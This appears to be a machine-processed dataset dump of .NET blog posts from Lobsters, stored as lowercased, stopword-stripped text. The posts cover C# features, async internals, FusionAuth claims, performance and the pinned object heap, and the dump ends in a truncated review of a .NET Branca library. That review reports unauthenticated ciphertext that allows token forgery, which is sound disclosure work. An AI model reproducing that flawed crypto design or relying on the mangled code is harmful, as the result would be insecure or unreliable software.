debacle winget microsoft new package manager window ripped existing package called appget os developer fill hole window ecosystem microsoft offer job work kind product inside company ghost release competing product appears borrowed heavily design attribute original developer work internet get mad couple great point make incentivize user care project project take os sustainability seriously build profitable business around project care longterm viability stated previously ecosystem need unified approach granted happen overnight need start ball rolling otherwise keep going path giving stuff away free whilst one company make billion dollar back work change people mind paying library support point farcical example tweet buying something igal joking krzysztof could afford waited year money might make f os contribution picking igal perfect illustration thousand people importantly business see os free run business using issue slack channel give support also free context feel free see thing area must change hope believe slow change whilst happening concentrating effort elsewhere continue maintain carter hopefully platform ready buying licence support net os library try luck refocusing energy focus answer f previously toyed f year back using fake build tool get personal reason way reflection fake c j shop trying learn worked whilst trying get thing shipped constantly allow time truly understand going also truly f dsl f trying learn two thing limited time also build script one thing work rarely touch occasion touch forgotten worked back square one however recently constant microsoft os drama mentioned c language feature rolled far quickly time use learn new feature reading tweet f user slowly coming conclusion community people control environment real passion control seemed defined way thing rather appears c stance day different way something c announced read tweet one stating learning c day would know idiomatic c due numerous way thing learning c today much harder would imagine learning year ago fact picture konrad konkosa sum nicely even today write blog post came across reddit post titled tired net bloat hidden magic constant change golang feel like thought also looking tweet reddit post see people similar mindset c year finding hard keep language started reading blog post watching video f started enjoy reading code people written first link would highly recommend introduction functional programming f ian russell series blog post walking syntax etc whilst solving business domain problem important learning f recommend enough also part net dddevent sourcing slack team f channel started ask noob question luckily got lot help lot youtube video pluralsight video watched learnt continued journey last couple month made comment others f thing done reply oh becoming one knew exactly meant think anyone argue f seem air elitism andor segregation around away c example chuckle people made comment fact recent f conference syme f language author addressed point asked community tweet nice thing positive one negative tweet undo positive one reflect f perception regard reminds stance took nancy development full flow new thing arrived aspnet discussion took place often reacted nancy age wonder aspnet team got idea easy worked hard thing part smaller community certain thing norm big fanfair come along microsoft announce new wonderful feature arrived grate somewhat think reaction quite visible amongst f people honest understand coming said knew getting tried walk gently go gun blazing rewarded significantly joining f software foundation slack team joining various channel could see large community people discussing working asking question thing helping beginner without ivory tower pointing laughing welcoming really helped along journey answered noob question without hint christ guy dumb response jubilant perception may included incorrect people proud working attending f conf clear well respected clearly clever guy community trying drive f via community fact day came across taskbuilder third party library interop net task f async implementation c asyncawaittask found f using third party library code design porting f pointing back original author contribution giving due respect deserves point time everything discussed seemed like good place gone learn enjoy found also hit usual learning curve experience coming across new thing go state ah get yay wtaf god dumbass understand going say f perfect silver bullet waiting last five silver bullet worked thought would coming c issue may annoy around tooling tried various language throughout career one thing c done well compared language tooling develop software macos might change linux soon write code f basically two choice vscode jetbrains rider vscode us plugin called ionide rider also f plugin know rider well c whilst fired ionide thing decided stick rider however thing rosy many feature rider get free c appear f plugins yet one example first spotted xml documentation starting noobie documentation key however looking giraffe xml doc work rider doc written markdown worked fine ionide instantly non standard approach speaking krzysztof cieślak said early made wrong decision advocating markdown fact ionide support traditional xml documentation good stuff thought let take look giraffe see swap markdown xml well bigger task hoped needed done people benefit editor one pr later done open rider view lovely new doc facepalm rider render xml doc properly f youtrack go file issue eugene auduchinok main man behind f support rider next intellisense f simply much support c much see intellisense crutch find massively useful learning productivity let see example c argument requires func action press ctrlspace rider offer create inline implementation create method simple example exist f matter ide use youtrack went kept going back probably become eugene favourite person hate love tooling get c would love see f make development experience better everyone another example analyzer chose npgsqlfsharp coding database helpfully analyzer validate sql write type use parameter many thing work vscode rider flip side rider many analyzer work vscode guess f issue ide issue interesting spot coming new language thing always seamless another thing also rely heavily decompiled third party code sourcelinked code debug actual source code decompiled version seems work rider vscode however using file member navigation rider downloaded source code work suffice say bombarding youtrack lot issue raised issue ionide would encourage others benefit tooling seem issue present enough make unbearable guess lot issue log could argued cosmetic like bit cosy fluffy ide support future far enjoyed coding f enjoyed reading people code f look forward path take fact happy announce july starting new job softwarepark initially working team writing f lucky join company friend already working worked past also get work alongside ian russell whose blog series mentioned helped tremendously getting started f softwarepark company based austria whose employee work remotely across europe share core belief writing software much look forward new journey working fine folk already employed however please pause take moment spare thought ian put hour day asking ridiculous question anyhow summary need monetise work net develop platform allow project thrive prevent microsoft adopting os much one make lot money c become large bucket syntax goodbye nancyfx hello f
15,Lobsters,dotnet,"C#, F#, .NET programming",C# 9: Simplified Parameter Null Validation,https://www.infoq.com/news/2020/06/CSharp-9-Null/,c simplified parameter null validation,simplified parameter null validation narrowly tailored feature proposal test plan orthoxerox suggested,last reported simplified parameter null validation feature challenged several competing proposal ranging attribute compiler flag full scale aop il weaving discarded favor narrowly tailored feature proposal reduces amount code needed validate nonnull parameter single character bang operator positioned identifier parameter list cause c compiler emit standard null checking code parameter example void string name translated void string name name null throw new argumentnullexception nameof name rule pretty straight forward null check injected beginning function code occur order parameter function signature null check specifically reference equality null ignoring operator overload used constructor check occur base class constructor called case iterators null checking always happen initial call lowered method compiler error occur null check appears parameter null eg struct unmanaged compiler error occur null check appears parameter without associated implementation eg abstract method delegate interface method partial method compiler error occur null check applied parameter compiler warning occur null check applied explicitly nullable parameter string x presumably allow subclass stricter base class compiler warning occur null check applied optional parameter null default value regarding constructor rule microsoft consider allowing parameter check occur invoking base class constructor always allowed net arguably preferable however c syntax expose capability want generate code created without using feature test plan see scenario generic void value ok void value struct error void value unmanaged error void value notnull ok void value class ok void value somestruct error void value someclass ok one flaw design offer support validating property value parameter implied orthoxerox suggested workaround bang operator applied set keyword scenario public foo foo get set public bar bar get return bar set bar value dosomethingelse
16,Lobsters,dotnet,"C#, F#, .NET programming",Exploring top-level statements in C# 9,https://www.tabsoverspaces.com/233831-exploring-top-level-statements-in-csharp-9,exploring toplevel statement c,exploring toplevel statement c elementary explore summary,exploring toplevel statement c jun min c roslyn wanted know toplevel statement feature c handled actually produced although originally planned quick test look il kept testing feature elementary started simplest code see using system consolewriteline test result fairly uncomplicated code compilergenerated internal static class program private static void main string args consolewriteline test explore return exit code using system consolewriteline test return compilergenerated internal static class program private static int main string args consolewriteline test return look like hmm use asyncawait using systemthreadingtasks await taskcompletedtask return compilergenerated internal static class program async state machine omitted asyncstatemachine typeof main private static task int main string args main statemachine default main statemachine tbuilder asynctaskmethodbuilder int create statemachine statemachine tbuilderstart ref statemachine return statemachine tbuildertask private static int main string args return main args getawaiter getresult ok ok expected still nice limited yet feature maybe local function using system test void test void consolewriteline test compilergenerated internal static class program private static void main string args main internal static void main consolewriteline test main internal static void main nothing special normal local function expanded class aah class going nested using system consolewriteline new test class test compilergenerated internal static class program private static void main string args consolewriteline new test internal class test ah make sense nested would create unnecessary complication naming variable using system var datetimeutcnowadd timespanfromseconds consolewriteline test void test consolewriteline compilergenerated internal static class program structlayout layoutkindauto private struct public datetime private static void main string args default datetimeutcnowadd timespanfromseconds consolewriteline main ref internal static void main ref consolewriteline finally something interesting compiler creating instance field expecting trying force creating struct value type instead passing around using ref unsafe code let start safe ish span using system span long longs stackalloc long consolewriteline longsisempty compilergenerated internal static class program private static void main string args consolewriteline stackalloc long isempty let switch really unsafe code using system long longs stackalloc long fails error pointer fixed size buffer may used unsafe context aka ok look like compiler generate unsafe main ok create unsafe method using system test unsafe void test fixed char value safe char ptr value ptr consolewriteline ptr ptr compilergenerated internal static class program private static void main string args main internal unsafe static void main fixed char ptr safe getpinnablereference char ptr consolewriteline nice think enough playing summary like compiler us struct ref passing handle global instance variable smart although look like small feature almost like take code smack generated main easy lot feature c one use luckily feature one seamlessly use using toplevel statement
17,Lobsters,dotnet,"C#, F#, .NET programming","The anatomy of async iterators (aka await, foreach, yield)",https://blog.marcgravell.com/2020/05/the-anatomy-of-async-iterators-aka.html,anatomy async iterators aka await foreach yield,http sharplabio iterators sync world absolutely end need async iterators via nuget might complete synchronously cancellation summary,going discus mechanism concept relating async iterators c hope demystifying bit also showing use advanced slightly hidden feature going give illustration happens hood note illustration literal generated expansion deliberately help show conceptually happening ignore sublte implementation detail accidental always want see actual code tool like http sharplabio awesome change result view c paste code interested onto left iterators sync world discus async iterators let start recapping iterators many folk may already familiar hey help set scene importantly useful allow u compare contrast later look async change thing know write foreach loop sequence form foreach var item somesource consolewriteline item item somesource return get line console somesource could returning fully buffered set data like list string ienumerable string somesource int x var list new list string int listadd result somesource x x result return list problem requires somesource run completion get even first result could take lot time memory generally restrictive often trying represent sequence may unbounded least openended example could pulling data remote work queue want holding one pending item time b may logical end turn c definition sequence purpose foreach fine instead returning list write iterator block ienumerable string somesource int x int yield return result somesource x x result work similarly fundamental difference noticeably nt ever buffer make one element available time understand work useful take another look foreach compiler interprets foreach something like following using var iter somesource getenumerator itermovenext var item itercurrent consolewriteline item little loose phrasing foreach nt actually tied ienumerable ducktyped api shape instead using may may example fundamentally compiler call getenumerator expression passed foreach creates loop checking movenext defines data advance mechanism success case access current property expose element advanced aside historically prior c compiler used scope item outside loop might sound innocent source absolutely end confusion code erros question stack overflow think captured variable hopefully see consumer access unbounded forwardsonly sequence via movenext current approach get implemented iterator block anything involving yield keyword actually incredibly complex going take lot liberty going similar ienumerable string somesource int x new generatedenumerable x class generatedenumerable ienumerable string private int x public generatedenumerable int x thisx x public ienumerator string getenumerator new generatedenumerator x nongeneric fallback ienumerator ienumerablegetenumerator getenumerator class generatedenumerator ienumerator string private int x public generatedenumerator int x thisx x public string current get private set nongeneric fallback object ienumeratorcurrent current finally code would go public void dispose advance logic public bool movenext current result somesource x x result return true else return false api essentially deprecated never used void ienumeratorreset throw new notsupportedexception let tear apart firstly need object represent ienumerable also need understand ienumerable ienumerator returned getenumerator different apis generated version lot overlap share instance help discus kept two concept separate call somesource create generatedenumerable store state x passed somesource expose required ienumerable api later could much later caller iterates foreach data getenumerator invoked call generatedenumerator act cursor data movenext logic implement loop conceptually one step per call movenext data current assigned thing would passed yield return note also yield break c keyword terminates iteration would essentially return false generated expansion note nuanced difference handwritten version c compiler need deal example happens change x enumerator code movenext later iterate data second time value x emphasis nt care nuance discussion hopefully give enough flavor understand foreach iterators yield let get onto interesting bit async need async iterators work great synchronous world lot net work favoring asyncawait particular improve server scalability big problem code bool movenext explicitly synchronous thing take time blocking thread blocking thread increasingly anathema u context earlier remote work queue example might anything second minute hour really nt want block thread kind time closest without async iterators fetch data asynchronously buffered example async task list string somesource int x semantics getting back buffering assuming nt want fetch everything one go get around eventually end implementing kind async batch loop monstrosity effectily reimplements foreach using manual ugly code negating reason foreach even exists address c bcl recently added support async iterators yay new apis available via nuget public interface iasyncenumerable iasyncenumerator getasyncenumerator cancellationtoken cancellationtoken default public interface iasyncenumerator iasyncdisposable current get valuetask bool movenextasync public interface iasyncdisposable valuetask disposeasync let look example time added async look consumer first code foreach let imagine iasyncenumerable string somesourceasync int x throw new notimplementedexception focus loop c await foreach concept await foreach var item somesourceasync consolewriteline item compiler interprets something similar await using var iter somesourceasync getasyncenumerator await itermovenextasync var item itercurrent consolewriteline item note await using similar using disposeasync called awaited instead dispose even cleanup code asynchronous key point actually pretty similar sync version added await ultimately however moment add await entire body ripped apart compiler rewritten asynchronous state machine nt topic article even going try cover await implemented behind scene today miracle happens suffice observant might also wondering wait cancellation nt worry get enumerator along await foreach also write async iterators yield example could async iasyncenumerable string somesourceasync int x int await taskdelay simulate async something yield return result somesource x x result real code could consuming data remote source asynchronously effective mechanism expressing open sequence asynchronous data particular remember await itermovenextasync might complete synchronously data available immediately context switch imagine example iterator block request data remote server page yield return record data current page making available immediately await need fetch next page behind scene compiler generates type implement iasyncenumerable iasyncenumerator piece time even obtuse owing asyncawait restructuring intend try cover hope instead wave hand say know expansion wrote hand earlier like async however important topic overlooked cover cancellation cancellation async apis support cancellation via cancellationtoken exception look back iasyncenumerable see passed getasyncenumerator method writing loop hand achieved via withcancellation similarly configureawait used configure await indeed even configureawait use example could showing config option action await foreach var item somesourceasync withcancellation cancellationtoken configureawait false consolewriteline item would semantically equivalent var iter somesourceasync getasyncenumerator cancellationtoken await using iterconfigureawait false await itermovenextasync configureawait false var item itercurrent consolewriteline item split iter local illustrate configureawait applies disposeasync via await iterdisposeasync configureawait false finally pas cancellationtoken iterator use thing get even fun naive way would think along line ca nt take cancellationtoken getasyncenumerator called perhaps create type hold state get point create iterator block getasyncenumerator method something like unnecessary copy iasyncenumerable string somesourceasync int x new somesourceenumerable x class somesourceenumerable iasyncenumerable string private int x public somesourceenumerable int x thisx x public async iasyncenumerator string getasyncenumerator cancellationtoken cancellationtoken default int await taskdelay cancellationtoken simulate async something yield return result somesource x x result work cancellationtoken passed via withcancellation iterator cancelled correct time including taskdelay could also check iscancellationrequested call throwifcancellationrequested point iterator block right thing would happen making life hard compiler u via enumeratorcancellation could also async iasyncenumerable string somesourceasync int x enumeratorcancellation cancellationtoken cancellationtoken default int await taskdelay cancellationtoken simulate async something yield return result somesource x x result work similarly approach cancellationtoken parameter make token getasyncenumerator via withcancellation available iterator block nt create dummy type one slight nuance though changed signature somesourceasync adding parameter code still compiles parameter optional prompt question happens passed one example difference option cancellation await foreach var item somesourceasync option b cancellation via withcancellation await foreach var item somesourceasync withcancellation cancellationtoken option c cancellation via somesourceasync await foreach var item somesourceasync cancellationtoken option cancellation via await foreach var item somesourceasync cancellationtoken withcancellation cancellationtoken option e cancellation via different token await foreach var item somesourceasync tokena withcancellation tokenb answer right thing happens nt matter api use cancellation token provided respected pas two different token either token cancelled considered cancelled happens original token passed via parameter stored field generated enumerable type getasyncenumerator called parameter getasyncenumerator field inspected genuine different cancellable token cancellationtokensourcecreatelinkedtokensource used create combined token think createlinkedtokensource cancellation version taskwhenany otherwise either genuine cancellable used result write async cancellable iterator nt need worry much whether caller used api directly v indirectly might concerned fact changed signature however case neat trick use two method one without token consumer one token actual implementation public iasyncenumerable string somesourceasync int x somesourceimplasync x private async iasyncenumerable string somesourceimplasync int x enumeratorcancellation cancellationtoken cancellationtoken default int await taskdelay cancellationtoken simulate async something yield return result somesource x x result would seem ideal candidate local function unfortunately current time parameter local function allowed decorated attribute hope language compiler folk take pity u allow u future something like public iasyncenumerable string somesourceasync int x return impl compile today async iasyncenumerable string impl enumeratorcancellation cancellationtoken cancellationtoken default int await taskdelay cancellationtoken simulate async something yield return result somesource x x result equivalent using static local function usually preference avoid surprise capture work good news work preview language version guarantee land summary implement use async iterators c looked consumer producer version iterators synchronous asynchronous code path looked various way accessing cancellation asynchronous iterators lot going hopefully useful meaningful
18,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core Example with Custom Claims,https://fusionauth.io/blog/2020/05/27/sharing-custom-oauth-claims-with-a-asp-netcore-app,aspnet core example custom claim,build web application previous post setting role group warning full source code adding custom claim lambda created user viewing custom claim conclusion,previously used aspnet core build web application single protected page let extend application display role user fusionauth well custom claim going create group assign role group place user group also explore modifying json web token jwt using lambda expose user favorite color finally display claim secure page yet please set fusionauth web application specified previous post setting role group let navigate fusionauth administration console add role application note instead blue button edit application configuration click dark blue button person symbol add application role many free limited adding admin user role want create group call aspnet core user group associate user role finally need add user group navigate examplecom user user created registered dotnetcore application go group tab add user aspnet core user group warning user registered application member group role application nothing let login reminder start aspnet core application full source code available dotnet publish r head http click secure page see claim previously signed may need sign sign role present jwt see since role claim encoded jwt stored cookie whenever change user data fusionauth need log log user see change reflected aspnet core application adding custom claim add claim based user data time day anything else fusionauth add data jwt lambda javascript function receives jwt object signed modify remember way back created user specified favorite color command line option well going send information aspnet core web application display valuable data lambda flexible pull user registration data modify token removing attribute also though immutable lambda function populate jwt user registration jwtfavoritecolor userdatafavoritecolor create going use fusionauth api rather administration console felt long since curled something create api key called lambda management allowing full access lambda api allow user key patch application object well need latter configure fusionauth application use lambda shell script creates lambda associate dotnetcore application must update authheader environment variable value api key created also sure update applicationid id dotnetcore application script call one api create lambda another configure application use also need extract id lambda create used sed regular expression extract id response first api call authheaderyourapikeyhere applicationidyourappidhere lambdaoutput curl xpost h authorization authheader h contenttype applicationjson http lambda body function populate jwt user registration jwtfavoritecolor userdatafavoritecolor name addfavoritecolor type jwtpopulate lambdaid echo lambdaoutputsed r id applicationpatch application lambdaconfiguration accesstokenpopulateid lambdaid idtokenpopulateid lambdaid output curl xpatch h authorization authheader h contenttype applicationjson http applicationid applicationpatch running shell script log admin user interface see lambda exists assigned run jwts created application course implied rather running script could create lambda using administration user interface associate application think lambda setup via shell script show power fusionauth api everything admin interface automate using api viewing custom claim head http see something like course much use realworld application display claim might customize user display based favorite color user role could gate functionality information conclusion post end journey integrating fusionauth aspnet core offloading user management concern identity management solution fusionauth free focus feature business logic application whether displaying user favorite color hopefully something useful
19,Lobsters,dotnet,"C#, F#, .NET programming",.NET async/await in a single picture,https://tooslowexception.com/net-asyncawait-in-a-single-picture/,net asyncawait single picture,calling thread may released work better scalability overlapped io io completion port io completion thread inplace iocp thread schedule back place epoll state machine instance thread http asyncexpertcom,said picture worth thousand word agree like preparing technical drawing explain various concept short story asyncawait work net main power behind asyncawait await ongoing io operation calling thread may released work provides great thread reusability thus better scalability much smaller number thread able handle amount operation comparing asynchronouswaiting approach main role play socalled overlapped io case window allows asynchronously delegate io operation operating system completion provided callback notify u result main workforce socalled io completion port iocp io completion port efficient mechanism asynchronous io window allowing observe huge amount ongoing operation one port indeed case net baked single iocp io completion thread managed threadpool observing single iocp typical number iocp thread equal number logical processor threadpool may create default change maximum callback io operation executed one iocp thread set result operation decides whether execute continuation inplace iocp thread beneficial incur context switch avoids cache trashing obviously risk polluting important iocp thread user code may lead thread starvation schedule back place may pointed synchronizationcontexttaskscheduler quite typically queued execution worker thread typically continuation scheduled worker thread one significant exception httpclient continuation window since net core note case linux epoll mechanism used instead iocps isare epoll thread listening event schedule continuation worker thread inlining may happen ongoing work rebuild threadpool linux using aio iouring made dot connected state machine instance keeping track status continuation execute whole context an drawing reminded famous thread article stephen cleary explains user code executing thread consumed asynchronous io operation performed indeed true although people also noticed comment iocp thread blocked processing io completion port notification almost thread similar picture generic relationship threadpool io completion port drawn pretty big attention yesterday may also interested work much bigger project http asyncexpertcom online course asynchronous concurrent programming net found interesting stay tuned subscribing newsletter abovementioned page
22,Lobsters,dotnet,"C#, F#, .NET programming",Repository Madness,https://alexbilson.dev/posts/multi-repository-madness/,repository madness,background subversion mismatched repository forest irrelevant change branch sync mistake resolution psgitsync script,month ago three colleague added new feature legacy net application one technical challenge faced distributed nature application codebase background code history originally stored subversion svn organization shifted active repository svn git early one carryovers original multirepository structure build app add feature local machine needed clone eight repository except one master repo repository dependency least one sometimes one contained mostly business implementation others mostly object definition yet others primarily web service example working service controller wanted add new object interface create interface separate repo write implementation current repo certain object implemented second repo defined third long job realized change system might unforseen result three overcame technolory exception mismatched repos forest irrelevant uncommited change mistake syncing dozen feature branch mismatched repository every time repository updated team member might spend halfday tracking mysterious error exception would point method one repository developer tracked error source discover error originated repo threw error another repo entirely eventually caught error see git pull likely caused mismatch change repos two common culprit first developer pull update every repository one repository would become outofsync might cause build error sometimes would cause runtime error second developer failed commit push every change relevant feature work amount repo synchronization would resolve error often developer know missed change next painful experience forest irrelevant change developer change nearly impossible identify forest file creation update caused build process change relevant product release current feature every time code built repository would increment app version multiple assembly version file repos contained frontend code flood html would generated precursor razor view engine copied master view repository given repo would multiple terminal buffer full change call git status might rightly ass gitignore file would alleviate problem created remember change across eight repository time developer needed verify file changed need run git status eight separate directory since developer check change every commit feature require many commits ton room error branch sync mistake team operated single working branch per repository dev would also one feature branch every repo sometimes several completed feature waiting code review example needed make change three file implement story file different repo would need feature branch four devs two feature branch open across eight repository many potential branch iteration could checked locally sixteen million assuming everyone branch pushed remote repository uptodate every local machine always case resolution developer worked code every day personal process made work proficient despite challenge team productive first commits took action first add gitignore file exclude massive number generated file local build process receive authorization right away wrote quick dirty powershell script explicitly restore delete irrelevant file script became irrelevant configured gitignore file added branch forest change tamed built powershell script automate many git task reduced likelihood branch mistake mismatched repos script could switch branch across every repository pull latest change everywhere print comprehensive file status script ensure never see issue speed cut mistake interested implemented powershell script need copy check source code psgitsync script
23,Lobsters,dotnet,"C#, F#, .NET programming",Single static binaries are coming to .NET Core,https://github.com/dotnet/runtime/issues/36590,single static binary coming net core,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
24,Lobsters,dotnet,"C#, F#, .NET programming",Performance best practices in C#,https://medium.com/@kevingosse/performance-best-practices-in-c-b85a47bdd93a,performance best practice c,performance best practice c waiting synchronously asynchronous code ever wait synchronously noncompleted task article configureawait code may called synchronization context use configureawait false await call ever meaning using await keyword async void never use async void avoid async possible culturesensitive comparison always use ordinal comparison concurrentbag never use concurrentbag without benchmarking prefer concurrentqueue readerwriterlock readerwriterlockslim never use readerwriterlock readerwriterlockslim without benchmarking prefer lambda function instead methodgroup converting enums string enum comparison note true anymore net core since version optimization performed automatically jit implement equality member structs http devblogsmicrosoftcompremierdeveloperperformanceimplicationsofdefaultstructequalityinc avoid unnecessary boxing using structs interface cancellationtoken subscription always inlined taskcompletionsource continuation often inlined unless good reason omit always use taskcreationsoptionsruncontinuationsasynchronously parameter creating taskcompletionsource taskcontinuationoptions taskcreationoptions taskrun taskfactorystartnew,performance best practice c recently compile list best practice c criteo figured would nice share publicly goal article provide nonexhaustive list code pattern avoid either risky perform poorly list may seem bit random context item spotted code point caused production issue hopefully serve warning prevent making mistakesalso note criteo web service rely highperformance code hence need avoid inefficient code pattern pattern make noticeable difference applicationslast least point already discussed length many article configureawait elaborate goal list point keep mind rather indepth technical description themwaiting synchronously asynchronous codedon ever wait synchronously noncompleted task including limited taskwait taskresult taskgetawaiter getresult taskwaitany taskwaitallas general advice synchronous dependency two threadpool thread susceptible cause threadpool starvation cause phenomenon described articleconfigureawaitif code may called synchronization context use configureawait false await callsnote however configureawait ever meaning using await keywordfor instance code make sense async voidnever use async void exception thrown async void method propagated synchronization context usually end crashing whole applicationif return task method instance implementing interface move async code another method call avoid async possibleout habitmuscle memory might write code semantically correct using async keyword needed significant overhead hot path try removing whenever possible however keep mind use optimization code wrapped block like trycatch using incorrect version since task awaited inside using block client might disposed getasync call completesculturesensitive comparisonsunless reason use culturesensitive comparison always use ordinal comparison instead make much difference enus culture internal optimization comparison get one order magnitude slower culture order magnitude linux string comparison frequent operation application quickly add upconcurrentbag never use concurrentbag without benchmarking collection designed specific usecases time item dequeued thread enqueued suffers important performance issue used otherwise need concurrent collection prefer concurrentqueue readerwriterlock readerwriterlockslim never use readerwriterlock readerwriterlockslim without benchmarking may tempting use kind specialized synchronization primitive dealing reader writer cost much higher simple monitor usable lock keyword unless number reader executing critical section time high concurrency enough amortize increased overhead code perform worseprefer lambda function instead methodgroupconsider following code resharper suggests rewrite code without lambda function may look cleaner unfortunately introduces heap allocation call indeed call compiled significant impact code called hot spotusing lambda function trigger compiler optimization cache delegate static field removing allocation work filter static may want cache delegate converting enums stringcalling enumtostring net costly reflection used internally conversion calling virtual method struct cause boxing much possible avoidedoftentimes enums actually replaced const string really need enum consider caching converted value dictionary amortize costenum comparisonsnote true anymore net core since version optimization performed automatically jitwhen using enums flag may tempting use enumhasflag method code cause two boxing allocation one convert enum another one hasflag virtual call struct make code disproportionately expensive instead sacrifice readability use binary operator implement equality member structswhen using struct comparison instance used key dictionary need override equalsgethashcode method default implementation us reflection slow implementation generated resharper usually good enoughmore information http devblogsmicrosoftcompremierdeveloperperformanceimplicationsofdefaultstructequalityincavoid unnecessary boxing using structs interfacesconsider following code tempting make intvalue struct avoid heap allocation since addvalue sendvalue expect interface interface reference semantics value boxed every call nullifying benefit optimization fact allocate even intvalue class since value boxed independently callif write api expect value structs try using generic method making method generic look useless first glance actually allows avoid boxing allocation intvalue structcancellationtoken subscription always inlinedwhenever cancel cancellationtokensource subscription executed inside current thread lead unplanned pause even subtle deadlocksyou optout behavior therefore cancelling cancellationtokensource ask whether safely let current thread hijacked answer wrap call cancel inside taskrun execute threadpooltaskcompletionsource continuation often inlinedjust like cancellationtoken subscription taskcompletionsource continuation often inlined nice optimization cause subtle error instance consider following program call tcssetresult cause continuation await processasync execute current thread therefore statement mutexwait executed thread supposed call mutexset resulting deadlock prevented giving taskcreationsoptionsruncontinuationsasynchronously parameter taskcompletionsourceunless good reason omit always use taskcreationsoptionsruncontinuationsasynchronously parameter creating taskcompletionsourcebeware code also compile use taskcontinuationoptionsruncontinuationsasynchronously instead taskcreationoptionsruncontinuationsasynchronously parameter ignored continuation keep inlined surprisingly common error taskcontinuationoptions come taskcreationoptions autocompletiontaskrun taskfactorystartnewunless reason use taskfactorystartnew always favor taskrun start background task taskrun us safer default importantly automatically unwraps return task prevent subtle error async method consider following program despite appearance end program displayed processing done taskfactorystartnew going return task task code wait outer task correct code would either await taskfactorystartnew processasync unwrap await taskrun processasync three legitimate usecases taskfactorystartnew starting task different schedulerexecuting task dedicated thread using taskcreationoptionslongrunning queuing task threadpool global queue using taskcreationoptionspreferfairness
25,Lobsters,dotnet,"C#, F#, .NET programming",Pinned Object Heap in .NET 5,https://tooslowexception.com/pinned-object-heap-in-net-5/,pinned object heap net,interesting change added gc dedicated introduces fragmentation would perfect get rid pinned object move different place allocator know nothing fact object created pinned future new allocation api provided array runtime documentation allocation little slower regular soh allocation limit array type reference contain reference ongoing discussion summary pr added kestrel,upcoming net interesting change added gc dedicated pinned object heap new type managed heap segment small large object heap far pinning cost introduces fragmentation general complicates object compaction lot used good practice like pin short time gc bother reduce probability gc happens many object pinned scenario use fixed keyword fact lightweight way flagging particular local variable pinned reference long gc happen additional overhead long time gc promote object generation gc common impact minimized also scenario use gchandle type pinned little bigger overhead need allocatefree handle however even applied rule produce fragmentation depending much pin long resulting layout pinned object memory many intermittent condition end would perfect get rid pinned object move different place sohloh separate place would simply ignored gc design considering heap compaction get pinning behaviour box however concept simple straightforward implement current api allocation c currently pinning twophase process allocate object store resulting reference somewhere pin object help fixed keyword gchandle word allocator know nothing fact object created pinned future altogether pinned object heap introduced net new allocation api provided first time since net instead using new operator able allocate array help two method gcallocatearray arraylength pinned true gcallocateuninitializedarray arraylength pinned true see new allocation api allows u specify want object pinned fact allows allocate directly poh instead sohloh question arises array microsoft say allowing allocate non array object certainly possible time see much value mostly scenario pinning really used pinning buffer various purpose buffer array word technically poh could contain object currently support array due provided allocation api read detailed design pinned object heap runtime documentation important remember allocation pinned object heap little slower regular soh allocation based perthreadbased allocation context synchronized free list gap like loh thus allocate poh appropriate free space must found one poh segment treat poh replacement longrunning gchandlebased allocation replacement rather shortliving fixedbased pinning yet another important limitation pinned object heap second design decision limit array type reference contain reference blittable type technical limitation decision derived typical pinning use case mostly pin buffer unmanaged data like primitive type int byte decision additional performance benefit gc may omit poh marking reachable object word outgoing reference need treat pohallocated object potential root corresponding check made runtime depends pinned flag public static allocatearray int length bool pinned false pinned runtimehelpersisreferenceorcontainsreferences throwhelperthrowinvalidtypewithpointersnotsupported typeof thus able compile code follows var x gcallocatearray string pinned true throw exception execution systemargumentexceptionmessage use type systemstring value type without pointer reference supported may wonder runtime check preferred unmanaged generic constrain using obviously would require create dedicated method pinning public static allocatepinnedarray int length unmanaged net team planning extend allocatearray additional parameter future like specifying generation want allocate least want limit providing specialized method also ongoing discussion whether add gcispinnedheapobject obj api checking given object allocated poh decided yet overhead checking probably overwhelm benefit typical scenario last word think various usage scenario array used help api typically still address fixed keyword may still necessary unsafe public static void main string args var pinnedarray gcallocatearray byte pinned true fixed byte ptr pinnedarray noop pinning influence gc compaction know fact kind noop influence object poh bad consequence gc summary see first usage showing like recently pr added kestrel ben adam knowing fact presented post next one write implementation arraypool based array allocated pinned object heap
26,Lobsters,dotnet,"C#, F#, .NET programming",Rolling your own crypto gone wrong: A look at a .NET Branca implementation,https://brycx.github.io/2020/08/22/a-look-at-a-branca-implementation.html,rolling crypto gone wrong look net branca implementation,introduction multiple reason paseto branca made net implementation new scottbradyidentitymodel bouncycastle inspection tokenssecuritytokenexception invalid message authentication code test vector nonce generation systemsecuritycryptographyrandomnumbergeneratorgetbytes unauthenticated ciphertext construction draft rfc rfc ciphertext modified without invalidating token identitymodel allows attacker arbitrarily modify payload branca token pretty clear forgeable token key nacl used identitymodel allows attacker forge api token must xcrypto draft rfc constanttime mac comparison summary found mistake reach,introduction time back looking token authentication format authenticate api call even attempt look jwt co multiple reason landed paseto branca chose branca simplicity needed authenticated api call shared symmetric key branca paseto implemented using paseto also support asymmetric authentication need quite pleased looking straightforward branca made version timestamp nonce ciphertext b tag simply construct header encrypt authenticate payload using header aad back one net implementation targeted net core whereas needed net framework took quick look test vector used instead available github thought may toy project fun dropped forgot fast forward couple day ago returned find new net core implementation also published nuget got hope might polished implementation could get working net framework scottbradyidentitymodel relatively new nuget three release total first release beginning may year latest beginning august us bouncycastle cryptographic implementation offer paseto branca note code discussed based master branch also referring nuget identitymodel throughout rest post inspection tokenssecuritytokenexception invalid message authentication code pulled identitymodel new project took test vector j reference implementation linked specification branca static void testbranca string expectedtoken string expectedpayload var handler new brancatokenhandler var key supersecretkeyyoushouldnotcommit try var actualtoken handlercreatetoken expectedpayload key var actualpayload handlerdecrypttoken expectedtoken key catch exception e consolewriteline failed nexpectedtoken nexpectedpayload nexception n expectedtoken expectedpayload emessage static void main string args testbranca hello world testbranca hello world testbranca hello world running test gave failed expectedtoken expectedpayload hello world exception invalid message authentication code failed expectedtoken expectedpayload hello world exception invalid message authentication code failed expectedtoken expectedpayload hello world exception invalid message authentication code already good start nonce generation starting top file containing branca implementation come createtoken first thing nonce generation var nonce new byte randomnumbergeneratorcreate getbytes nonce us systemsecuritycryptographyrandomnumbergeneratorgetbytes method intended cryptographic purpose check unauthenticated ciphertext nonce generated header created according specification problem come encryption keymaterial new keyparameter key var parameter new parameterswithiv keymaterial nonce var engine new xchachaengine engineinit true parameter familiar bouncycastle checked source see keyparameter parameterswithiv simply wrapper parameter xchachaengine bouncycastle however implemented identitymodel using orgbouncycastlecryptoengines namespace scottbradyidentitymodelcrypto public class xchachaengine chachaengine public xchachaengine base public override string algorithmname protected override int noncesize 